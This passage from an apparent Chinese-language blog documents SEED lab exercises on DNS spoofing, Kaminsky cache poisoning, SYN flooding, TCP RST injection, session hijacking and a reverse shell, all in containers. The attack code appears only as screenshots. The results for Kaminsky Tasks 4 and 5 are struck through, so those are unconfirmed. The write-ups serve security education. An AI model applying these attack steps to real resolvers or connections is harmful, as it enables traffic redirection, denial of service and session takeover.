class="code"><pre><code class="hljs bash">rndc-confgen<br></code></pre></td></tr></table></figure><p>返回了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@local-dns-server-10-9-0-53:/# rndc-confgen<br><span class="hljs-comment"># Start of rndc.conf</span><br>key <span class="hljs-string">&quot;rndc-key&quot;</span> &#123;<br>algorithm hmac-sha256;<br>secret <span class="hljs-string">&quot;vELiMCUV6P16BjZAZ3ayz1WpjDpQ0U+JU2QOOnfv74U=&quot;</span>;<br>&#125;;<br><br>options &#123;<br>default-key <span class="hljs-string">&quot;rndc-key&quot;</span>;<br>default-server 127.0.0.1;<br>default-port 953;<br>&#125;;<br><span class="hljs-comment"># End of rndc.conf</span><br><br><span class="hljs-comment"># Use with the following in named.conf, adjusting the allow list as needed:</span><br><span class="hljs-comment"># key &quot;rndc-key&quot; &#123;</span><br><span class="hljs-comment"># algorithm hmac-sha256;</span><br><span class="hljs-comment"># secret &quot;vELiMCUV6P16BjZAZ3ayz1WpjDpQ0U+JU2QOOnfv74U=&quot;;</span><br><span class="hljs-comment"># &#125;;</span><br><span class="hljs-comment"># </span><br><span class="hljs-comment"># controls &#123;</span><br><span class="hljs-comment"># inet 127.0.0.1 port 953</span><br><span class="hljs-comment"># allow &#123; 127.0.0.1; &#125; keys &#123; &quot;rndc-key&quot;; &#125;;</span><br><span class="hljs-comment"># &#125;;</span><br><span class="hljs-comment"># End of named.conf</span><br></code></pre></td></tr></table></figure><p>然后添加进<code>/etc/rndc.conf</code> 文件和<code>rndc.key</code> 文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;</span><br><span class="hljs-string">key &quot;rndc-key&quot; &#123;</span><br><span class="hljs-string">    algorithm hmac-sha256;</span><br><span class="hljs-string">    secret &quot;vELiMCUV6P16BjZAZ3ayz1WpjDpQ0U+JU2QOOnfv74U=&quot;;</span><br><span class="hljs-string">&#125;;</span><br><span class="hljs-string"></span><br><span class="hljs-string">options &#123;</span><br><span class="hljs-string">    default-key &quot;rndc-key&quot;;</span><br><span class="hljs-string">    default-server 127.0.0.1;</span><br><span class="hljs-string">    default-port 953;</span><br><span class="hljs-string">&#125;;</span><br><span class="hljs-string">&#x27;</span> | <span class="hljs-built_in">tee</span> /etc/rndc.conf &gt; /dev/null<br></code></pre></td></tr></table></figure><p>以及</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;vELiMCUV6P16BjZAZ3ayz1WpjDpQ0U+JU2QOOnfv74U=&quot;</span> | <span class="hljs-built_in">tee</span> /etc/rndc.key &gt; /dev/null<br></code></pre></td></tr></table></figure><p>再次运行<code>rndc status</code>，得到正确返回</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226105758013.png" alt=""></p></li></ol><hr><h6 id="Summary-of-the-DNS-Configuration">Summary of the DNS Configuration</h6><p><strong>Local DNS Server</strong></p><ol><li><p>另开一个终端，进入Local DNS Server，并且为了方便，将容器的主机名修改为<code>local-dns-server-10.9.0.53</code></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226105803469.png" alt=""></p></li><li><p>查看配置文件<code>etc/bind/named.conf</code>，可以看到Local DNS Server已经部署了bind9，接下来可以进行本地DNS服务器的一些配置</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226105812839.png" alt=""></p></li><li><p><em><strong>Simplification.</strong></em></p><p>在文件<code>/etc/bind/named.conf.options</code>中，将源端口号固定为33333，防止随机端口</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226105822896.png" alt=""></p></li><li><p><em><strong>Turning off DNSSEC.</strong></em></p><p>在文件<code>/etc/bind/named.conf.options</code>中，关闭DNSSEC，DNSSEC是用来防御DNS欺骗的机制，为了使攻击更容易实现</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226110312648.png" alt=""></p></li><li><p><em><strong>DNS cache.</strong></em></p><p>使用命令清除DNS缓存</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226110320492.png" alt=""></p></li><li><p><em><strong>Forwarding the <a href="http://attacker32.com">attacker32.com</a> zone.</strong></em></p><p>在配置文件<code>etc/bind/named.conf</code>中，设置了请求attacker32.com域名的请求，都会被转发到攻击主机10.9.0.153</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226110328587.png" alt=""></p></li></ol><hr><p><strong>User machine.</strong></p><ol><li><p>另开一个终端，进入user主机，并且为了方便，将容器的主机名修改为<code>user-10.9.0.5</code></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226110334853.png" alt=""></p></li><li><p>在<code>/etc/resolv.conf</code>文件中，添加一条nameserver记录，表示在进行DNS请求时，将Local DNS Server作为首要DNS服务器</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226110339232.png" alt=""></p></li></ol><hr><p><strong>Attacker’s Nameserver.</strong></p><ol><li><p>另开一个终端，进入Attacker’s Nameserver，并将hostname设置为<code>attacker-ns-10-9-0-153</code></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226110346502.png" alt=""></p></li><li><p>在<code>etc/bind/named.conf</code>文件中，设置了第一个为合法的<code>zone attacker32.com</code>，第二个为虚假的<code>example.com zone</code></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226110352804.png" alt=""></p></li></ol><p><strong>至此，环境全部部署完成了！</strong></p><hr><h6 id="Testing-the-DNS-Setup">Testing the DNS Setup</h6><p><strong>Get the IP address of <a href="http://ns.attacker32.com">ns.attacker32.com</a>.</strong></p><ol><li><p>使用user主机向<code>ns.attacker32.com</code>发出DNS请求，发现返回的是attacker的ip，即Local DNS Server把请求转发给了Attacker’s Nameserver</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226110359590.png" alt=""></p></li></ol><p><strong>Get the IP address of <a href="http://www.example.com">www.example.com</a>.</strong></p><ol><li><p>使用user主机向<code>www.example.com</code>发出DNS请求，Local DNS Server将查询发送到了互联网中example.com官方的nameserver</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226110405211.png" alt=""></p></li><li><p>从指定DNS服务器（<a href="http://ns.attacker32.com">ns.attacker32.com</a>）上查询，<a href="http://xn--ns-hi6c831do5e49zjumwmz.attacker32.com">查询直接发给ns.attacker32.com</a>，<a href="http://xn--Attackerexample-sj3xyb6f669exk5dq7eqp5cww9dla7724c8t0a.com">并且其获得的结果与Attacker上的example.com</a> zone文件中相同</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226110411045.png" alt=""></p></li></ol><p><strong>测试成功！</strong></p><hr><h5 id="Task-1-Directly-Spoofing-Response-to-User">Task 1: Directly Spoofing Response to User</h5><ol><li><p>创建<code>spoof_ns_task1.py</code></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226110416929.png" alt=""></p></li><li><p>将这个文件复制到attacker主机中</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226110423350.png" alt=""></p></li><li><p><font color='red'>*注：</font>这里因为发现脚本要使用<font color='orange'>scapy的第三方库</font>，但是docker中并不好安装，所以更改了一下attacker的<code>Dockerfile</code>，将scapy安装进docker容器当中，如下图<font color='purple'>（因为一开始换源失败，还搜了一些资料终于找到了解决方法）</font>，修改完后重新<code>docker-compose build</code>以及<code>docker-compose up</code></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226110428933.png" alt=""></p></li><li><p>在attacker主机中运行<code>spoof_ns_task1.py</code>文件，可以发现不会报scapy的错误了，但是<font color='purple'>显示网卡没有监听到</font></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226110434565.png" alt=""></p></li><li><p>ifconfig一下，发现attacker主机中只有eth0网卡，<font color='green'>没有br-xxx的虚拟网卡</font></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226110442158.png" alt=""></p></li><li><p><font color='green'>尝试把<code>spoof_ns_task1.py</code>文件中的监听网卡改成eth0</font></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226110448369.png" alt=""></p></li><li><p><font color='green'>再次运行，发现可以运行了！</font></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226110453641.png" alt=""></p></li><li><p>记得首先Local DNS Server刷新一遍缓存<code>rnds flush</code><font color='red'>（如果报错请参照环境部署的第四点）</font></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226110458399.png" alt=""></p></li><li><p>在user主机发送请求</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226110503703.png" alt=""></p><p>这里看到并没有欺骗成功</p></li><li><p>尝试了好几次都没有成功，然后我发现在实验手册上有写（<font color='red'><strong>A potential issue.</strong></font>），可能是因为user在请求响应时，网络的响应比欺骗包的响应要更快，所以才会欺骗不成功</p></li><li><p>进入router容器，故意减慢向外发送的网络流量</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226110510051.png" alt=""></p><p>查看一下router和互联网连接(10.8.0.0)的网卡是eth0，所以执行对应的命令</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226110514938.png" alt=""></p></li><li><p>这里改了之后还是不行，返回了一样的，<font color='green'>所以把命令里的100ms改成了1000ms</font></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226110520940.png" alt=""></p></li><li><p>终于成功了（记得先在Local DNS Server上刷新）</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226110526144.png" alt=""></p><p>可以看到返回了想要的1.2.3.4，而且attacker主机上也显示发出了一个包</p></li></ol><p><strong>欺骗成功！</strong></p><hr><h5 id="Task-2-DNS-Cache-Poisoning-Attack-–-Spoofing-Answers">Task 2: DNS Cache Poisoning Attack – Spoofing Answers</h5><ol><li><p>创建<code>spoof_ns_task2.py</code>文件，注意网卡，为了实现将DNS中的缓存欺骗</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226110532905.png" alt=""></p></li><li><p>将文件复制到attacker主机中</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226110539273.png" alt=""></p></li><li><p>运行文件（记得先清除Local DNS Server的缓存）</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226110546618.png" alt=""></p></li><li><p><font color='orange'>这里在attacker容器里不管怎么弄都不能正确欺骗，所以还是用自己的主机试了一下成功了</font></p><p>（记得修改本机ubuntu中的<code>/etc/bind/named.conf</code>文件——<font color='green'>不能修改的话可能是因为没有安装bind</font>）</p></li><li><p>把<code>spoof_ns_task2.py</code>监听的网卡改了，改成连接10.9.0.1的虚拟网卡</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226110743859.png" alt=""></p></li><li><p>然后直接运行（先在Local DNS Server上清除缓存）</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226110749464.png" alt=""></p><p>虽然有warning但还是正确运行了</p></li><li><p>在user1上发送请求，attacker端显示有发送欺骗包</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226110754861.png" alt=""></p><p>返回了虚假的域名1.2.3.4</p><p><strong>欺骗成功了！</strong></p></li><li><p>在Local DNS Server上拉下缓存，并查找一下</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226110801236.png" alt=""></p><p>发现确实是已经在DNS缓存上都修改了，已经将 <a href="http://www.example.com">www.example.com</a> 指向1.2.3.4了</p></li></ol><p><strong>投毒成功！</strong></p><hr><h5 id="Task-3-Spoofing-NS-Records">Task 3: Spoofing NS Records</h5><ol><li><p>创建<code>task3.py</code>，继续实现DNS欺骗，以达成访问任何example.com子域名的dns请求都会返回被某恶意域名服务器</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226110806671.png" alt=""></p></li><li><p>运行<code>task3.py</code>，以下是user主机请求不同example.com的域名返回的虚假域名</p><ol><li><p>example.com-&gt;1.2.3.4</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226110814447.png" alt=""></p></li><li><p><a href="http://www.example.com">www.example.com</a> -&gt;1.2.3.5</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226110820873.png" alt=""></p></li><li><p>其他的 比如hello.example.com-&gt;1.2.3.6</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226110825958.png" alt=""></p></li></ol></li><li><p>在Local DNS Server中查看缓存</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226110831314.png" alt=""></p><p>可以看到不仅反映了刚刚显示的虚假域名，example.com域名也指向了恶意的网址</p></li></ol><p><strong>欺骗成功！</strong></p><hr><h5 id="Task-4-Spoofing-NS-Records-for-Another-Domain">Task 4: Spoofing NS Records for Another Domain</h5><ol><li><p>创建<code>task4.py</code>文件，，让ns.attacker32.com被用作 google.com的名称服务器，注意是<code>ns=NSsec2/NSsec1</code></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226110836689.png" alt=""></p></li><li><p>执行后，user主机访问 <a href="http://www.example.com">www.example.com</a> （记得Local DNS Server先rndc flush）</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226110846926.png" alt=""></p><p>返回的是虚假域名1.2.3.4</p></li><li><p>Local DNS Server获取缓存，发现不仅有example.com的域名也有google.com的域名</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226110853073.png" alt=""></p><p><strong>说明google.com已经被篡改成了恶意域名，欺骗成功！</strong></p></li><li><p>只有代码为 <code>ns=NSsec2/NSsec1</code> 时才能成功在本地DNS服务器的本地缓存中篡改，因为BIND 9在处理响应包中的 NS 信息时，会按照先后顺序依次去连接 NS 指向的域名，直到成功连接后就停止操作。</p><p>也就意味着，其在处理DNS响应数据包时，解析第一个NS信息，就连接成功了，导致第二个NS信息没有被解析</p></li></ol><p><strong>task4完成！</strong></p><hr><h5 id="Task-5-Spoofing-Records-in-the-Additional-Section">Task 5: Spoofing Records in the Additional Section</h5><ol><li><p>创建<code>task5.py</code>，添加超出域的附加记录</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226110900133.png" alt=""></p></li><li><p>运行<code>task5.py</code>，使用user主机访问 <a href="http://www.example.com">www.example.com</a> （记得先在Local DNS Server上rndc flush）</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226110906725.png" alt=""></p><p>可以看到已经成功欺骗了，返回域名为1.2.3.5</p></li><li><p>获取一下Local DNS Server的缓存</p><p><a href="http://xn--ns-c62c77ljy0a.example.com">找到了ns.example.com</a></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226110915405.png" alt=""></p><p><a href="http://xn--ns-iy6c.attacker32.com">和ns.attacker32.com</a></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226110921762.png" alt=""></p><p><strong>两个NS记录都有</strong></p><p><strong>除了第一个1.2.3.4的Additional记录之外，5.6.7.8和3.4.5.6的Additional记录都没有</strong></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226110928084.png" alt=""></p></li></ol><p><strong>说明DNS对于超出域的附加记录不会被处理，也不会返回给查询的客户端。</strong></p><hr><h4 id="The-Kaminsky-Attack-Lab"><strong>The Kaminsky Attack Lab</strong></h4><h5 id="Lab-Environment-Setup-Task-1">Lab Environment Setup (Task 1)</h5><p>同<strong>Local DNS Attack Lab</strong></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226110934544.png" alt=""></p><p>欺骗目标变为 <a href="http://www.example.com">www.example.com</a> ，该域名真实ip为93.184.216.34，由ICANN管理</p><hr><h5 id="How-Kaminsky-attack-works">How Kaminsky attack works</h5><p>Kaminsky攻击是一种利用了DNS中漏洞的网络攻击。</p><p>DNS就像互联网上的电话本，可以把域名（比如<code>example.com</code>）转换成IP地址。Kaminsky攻击让攻击者能够篡改这个电话本，让DNS服务器错误地把一个域名指向攻击者指定的IP地址。</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226110940566.png" alt=""></p><p>而要实现Kaminsky攻击，需要遵循以下步骤：</p><ol><li><strong>寻找不存在的域名</strong>：攻击者向DNS服务器（比如Apollo）查询一个不存在的域名，比如<code>twysw.example.com</code>；</li><li><strong>DNS服务器请求信息</strong>：因为Apollo不知道这个域名，就去访问<code>example.com</code>的官方DNS服务器；</li><li><strong>伪造响应</strong>：在Apollo等待官方回应的时候，攻击者快速发送很多假的响应给Apollo，每个响应都有一个不同的随机生成的事务ID，希望其中一个能蒙对；</li><li><strong>绕过缓存</strong>：如果攻击者的假响应在官方响应之前到达Apollo，并且事务ID匹配，Apollo就会接受这个假响应，并把它存起来。如果假响应失败了，也没关系，攻击者可以换个名字再试一次，这样Apollo就得重新问一遍，攻击者就又有机会进行伪造了；</li><li><strong>替换DNS记录</strong>：如果攻击成功，Apollo就会错误地把<code>example.com</code>的DNS记录换成攻击者指定的服务器，这样其他人访问<code>example.com</code>时，可能会错误地指向攻击者控制的服务器。</li></ol><hr><h5 id="Task-2-Construct-DNS-request">Task 2: Construct DNS request</h5><ol><li><p>创建<code>task2.py</code>文件，伪造从user给Local DNS Server发送DNS查询的数据包，让Local DNS Server向其他DNS Server发起查询</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226110956059.png" alt=""></p></li><li><p>打开wireshark，选择any进行监听</p><p>执行<code>task2.py</code>文件（记得先在Local DNS Server执行rndc flush）</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226111003186.png" alt=""></p></li><li><p>wireshark中监听到了DNS数据包，这个端口60232可以看出来确实发送了DNS请求</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226111009800.png" alt=""></p></li><li><p>往下看，发现Local DNS Server确实没有找到本地缓存的 <a href="http://www.example.com">www.example.com</a> 域名，所以向别的DNS进行请求了</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226111017863.png" alt=""></p></li></ol><p><strong>task2完成！</strong></p><hr><h5 id="Task-3-Spoof-DNS-Replies">Task 3: Spoof DNS Replies.</h5><ol><li><p>创建<code>task3.py</code>，伪造Local DNS Server返回 <a href="http://www.example.com">www.example.com</a> 的响应</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226111025456.png" alt=""></p></li><li><p>打开wireshark，选择any进行监听</p><p>执行<code>task3.py</code>文件（记得先在Local DNS Server执行rndc flush）</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226111033385.png" alt=""></p></li><li><p>响应成功，虚假的response成功到达Local DNS Server</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226111042614.png" alt=""></p><p>指向了虚假的1.2.3.4</p></li></ol><p><strong>task3完成！</strong></p><hr><h5 id="Task-4-Launch-the-Kaminsky-Attack">Task 4: Launch the Kaminsky Attack</h5><ol><li><p>修改<code>gen_dns_request.py</code>文件如下，生成虚假的DNS请求包，并将包保存在<code>ip_req.bin</code>文件中</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226111052485.png" alt=""></p></li><li><p>运行<code>gen_dns_request.py</code>文件，得到<code>ip_req.bin</code>文件，得到虚假的DNS请求包</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226111059515.png" alt=""></p></li><li><p>修改<code>gen_dns_response.py</code>文件如下，生成虚假的DNS响应包，并将包保存在<code>ip_resp.bin</code>文件中</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226111105520.png" alt=""></p></li><li><p>执行<code>gen_dns_response.py</code>文件，得到<code>ip_resp.bin</code>文件，得到虚假的DNS响应包</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226111113084.png" alt=""></p></li><li><p>修改<code>/Labsetup/Files/attack.c</code>文件</p><ol><li><p>send_dns_request()函数</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226111119441.png" alt=""></p></li><li><p>send_dns_response()函数</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226111125808.png" alt=""></p></li><li><p>main函数中的while循环</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226111205659.png" alt=""></p></li><li><p>记得修改函数声明</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226111213603.png" alt=""></p></li></ol></li><li><p>编译<code>attack.c</code>文件并运行，attacker发送大量的虚假包并进行虚假响应，并尝试写入Local DNS Server的缓存中</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226111220031.png" alt=""></p></li><li><p><s>可以看到Local DNS Server已经能看到被欺骗了</s></p></li></ol><p><strong><s>task4完成！</s></strong></p><hr><h5 id="Task-5-Result-Verification"><s>Task 5: Result Verification</s></h5><ol><li><p>使用user终端请求 <a href="http://www.example.com">www.example.com</a> ，验证实验结果</p></li><li><p>请求时的抓包观察</p></li><li><p>再直接向attacker的DNS Server进行请求</p></li><li><p>请求时的抓包观察</p></li></ol><p><strong><s>验证Kaminsky Attack已经成功了！</s></strong></p><hr><h3 id="实验总结">实验总结</h3><p><s>删掉啦</s></p>]]></content>
    
    
    <categories>
      
      <category>study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SEED-Labs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Lab 10</title>
    <link href="/2024/12/26/lab10/"/>
    <url>/2024/12/26/lab10/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h1>Lab 10-TCP攻击实验</h1><h3 id="实验环境">实验环境</h3><ul><li>Ubuntu 20.04 (seed-ubuntu)</li></ul><h3 id="实验内容">实验内容</h3><p><s>删掉啦</s></p><!-- 本实验的学习目标是让学生获得有关漏洞以及针对这些漏洞的攻击的第一手经验。聪明人从错误中学习。在安全教育中，我们研究导致软件漏洞的错误。研究过去的错误不仅有助于学生理解为什么系统容易受到攻击，为什么“看似良性”的错误会变成灾难，以及为什么需要许多安全机制。更重要的是，它还帮助学生了解漏洞的常见模式，从而避免将来犯类似的错误。此外，使用漏洞作为案例研究，学生可以学习安全设计、安全编程和安全测试的原则。TCP/IP协议中的漏洞代表了协议设计和实现中的一种特殊类型的漏洞；它们提供了一个宝贵的教训，说明了为什么安全性应该从一开始就设计好，而不是事后才加上。此外，研究这些漏洞有助于学生了解网络安全的挑战以及为什么需要许多网络安全措施。在本实验中，学生将对TCP进行几个攻击。本实验涵盖以下主题：- TCP协议- TCP SYN洪水攻击和SYN cookie- TCP重置攻击- TCP会话劫持攻击- 反向Shell --><hr><h3 id="实验步骤">实验步骤</h3><h4 id="环境部署">环境部署</h4><ol><li><p>启动容器</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226104935934.png" alt=""></p></li><li><p>为了方便分辨容器，进入四个容器，并对主机名进行更改</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226104942394.png" alt=""></p></li></ol><hr><h4 id="Task-1-SYN-Flooding-Attack">Task 1: SYN Flooding Attack</h4><h5 id="Task-1-1-Launching-the-Attack-Using-Python">Task 1.1: Launching the Attack Using Python</h5><ol><li><p>创建<code>synflood.py</code>，用于执行synflood攻击</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226104947690.png" alt=""></p></li><li><p>将<code>synflood.py</code>复制到attacker主机中</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226104952916.png" alt=""></p></li><li><p>此时victim主机的tcp连接为</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226104957855.png" alt=""></p></li><li><p>attacker主机运行<code>synflood.py</code>，此时查看victim主机的tcp连接</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226105003130.png" alt=""></p><p><strong>被泛洪攻击了</strong></p></li><li><p>查看一下victim主机中处于<code>SYN_RECV</code>状态的TCP连接的数量，可以看出连接数量非常多</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226105008427.png" alt=""></p></li><li><p>此时 user1主机telnet 连接victim主机</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226105014008.png" alt=""></p></li></ol><p><strong>完全不影响连接，很快就连接上了</strong></p><hr><h5 id="Task-1-2-Launch-the-Attack-Using-C">Task 1.2: Launch the Attack Using C</h5><ol><li><p>先清空一下</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226105021389.png" alt=""></p></li><li><p>进入<code>volumes</code>文件夹，编译<code>synflood.c</code>文件，将可执行文件<code>synflood</code>复制到攻击主机中</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226105026684.png" alt=""></p></li><li><p>在attacker主机中运行，victim主机中又出现了大量的tcp连接</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226105340481.png" alt=""></p></li><li><p>查看tcp连接的数量</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226105347222.png" alt=""></p><p><strong>可以看到数量非常的多，泛洪攻击成功了！</strong></p></li><li><p>使用user1主机telnet连接victim主机</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226105353562.png" alt=""></p></li></ol><p><strong>telnet连接失败！</strong></p><hr><h5 id="Task-1-3-Enable-the-SYN-Cookie-Countermeasure">Task 1.3: Enable the SYN Cookie Countermeasure</h5><ol><li><p>先清空一下</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226105401417.png" alt=""></p></li><li><p>在victim主机启动syncookies</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226105406094.png" alt=""></p></li><li><p>继续在attacker主机执行程序进行泛洪攻击，victim主机出现大量tcp连接</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226105412089.png" alt=""></p></li><li><p>但此时user1主机却可以telnet连接victim主机</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226105417467.png" alt=""></p></li></ol><p><strong>telnet连接成功！</strong></p><hr><h4 id="Task-2-TCP-RST-Attacks-on-telnet-Connections">Task 2: TCP RST Attacks on telnet Connections</h4><ol><li><p>先得到虚拟网卡的名称</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226105422595.png" alt=""></p></li><li><p>创建<code>tcprst.py</code>，用于执行TCP RST攻击</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226105427208.png" alt=""></p></li><li><p>复制到attacker主机中去</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226105432357.png" alt=""></p></li><li><p>attacker主机中执行程序</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226105437457.png" alt=""></p></li><li><p>user1尝试telnet连接attacker主机</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226105442260.png" alt=""></p></li></ol><p><strong>连接被切断了，无法连接！</strong></p><hr><h4 id="Task-3-TCP-Session-Hijacking">Task 3: TCP Session Hijacking</h4><ol><li><p>创建<code>tcphijacking.py</code>，用于在客户机进行telnet连接时，执行tcp会话劫持，并向主机中写入一个文件</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226105447026.png" alt=""></p></li><li><p>复制到attacker主机中</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226105451742.png" alt=""></p></li><li><p>user1先进行telnet连接</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226105456607.png" alt=""></p></li><li><p>attacker主机执行<code>tcphijacking.py</code></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226105501597.png" alt=""></p></li><li><p>attacker主机中返回了劫持的信息</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226105506498.png" alt=""></p><p>此时user1主机卡住不动了</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226105512537.png" alt=""></p></li><li><p>victim主机中确实被写入了一个文件</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226105520338.png" alt=""></p></li></ol><p><strong>TCP会话劫持成功！</strong></p><hr><h4 id="Task-4-Creating-Reverse-Shell-using-TCP-Session-Hijacking">Task 4: Creating Reverse Shell using TCP Session Hijacking</h4><ol><li><p>创建<code>reverseshell.py</code>文件，用于执行TCP会话劫持，并实现反弹shell</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226105526850.png" alt=""></p></li><li><p>将<code>reverseshell.py</code>文件复制到attacker主机中</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226105532097.png" alt=""></p></li><li><p>再新开一个终端，用于在attacker主机中进行监听</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226105537484.png" alt=""></p></li><li><p>user1主机telnet连接victim主机</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226105542839.png" alt=""></p></li><li><p>attacker主机执行<code>reverseshell.py</code>文件</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226105548545.png" alt=""></p></li><li><p>attacker主机的监听有所返回</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226105553436.png" alt=""></p><p><strong>反弹shell成功了！</strong></p></li><li><p>测试一下</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226105558334.png" 